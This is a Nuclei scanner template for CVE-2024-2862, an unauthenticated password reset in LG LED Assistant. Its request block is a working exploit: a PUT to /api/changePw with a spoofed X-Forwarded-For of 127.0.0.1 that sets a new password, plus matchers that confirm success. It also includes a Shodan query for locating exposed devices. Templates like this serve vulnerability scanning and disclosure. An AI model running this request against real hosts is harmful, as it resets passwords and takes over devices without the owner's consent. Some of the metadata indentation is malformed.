id: CVE-2024-2862

info:
  name: LG LED Assistant - Unauthenticated Password Reset
  author: beginee
  severity: high
  description: |
    The /api/changePw endpoint in LG LED Assistant allows unauthenticated password resets
    when requests are considered to come from localhost. An attacker can spoof the
    X-Forwarded-For header with value 127.0.0.1 to trigger the behavior and receive a success response.
    reference:
      - https://nvd.nist.gov/vuln/detail/CVE-2024-2862
      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2862
      - https://lgsecurity.lge.com/bulletins/idproducts#updateDetails
      - https://www.tenable.com/security/research/tra-2024-08
    classification:
      cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (NVD)
      cvss-score: 9.8
      cna-cvss-score: 9.1
      cna-cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
      cve-id: CVE-2024-2862
      cwe-ids:
        - CWE-640
        - CWE-287
      epss-score: (see NVD/EPSS feeds)

    metadata:
      verified: true
      max-request: 1
      suggested-shodan-query: 'http.title:"LG LED Assistant" OR http.title:"LED Assistant"'

    tags: cve,lg,unauthenticated,password-reset,changePw,X-Forwarded-For

variables:
  username: "testuser"
  new_password: "Password@123"
  hostname: "testhost"

http:
  - method: PUT
    path:
      - "{{BaseURL}}/api/changePw"
    headers:
      X-Forwarded-For: "127.0.0.1"
      User-Agent: "nuclei-cve-2024-2862"
      Content-Type: "application/x-www-form-urlencoded"
    body: "newPw={{new_password}}&hostName={{hostname}}&to=to&user={{username}}&from=from"
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - '"resCode"\s*:\s*"SUCC"'
    extractors:
      - type: regex
        name: rescode
        regex:
          - '"resCode"\s*:\s*"([^"]+)"'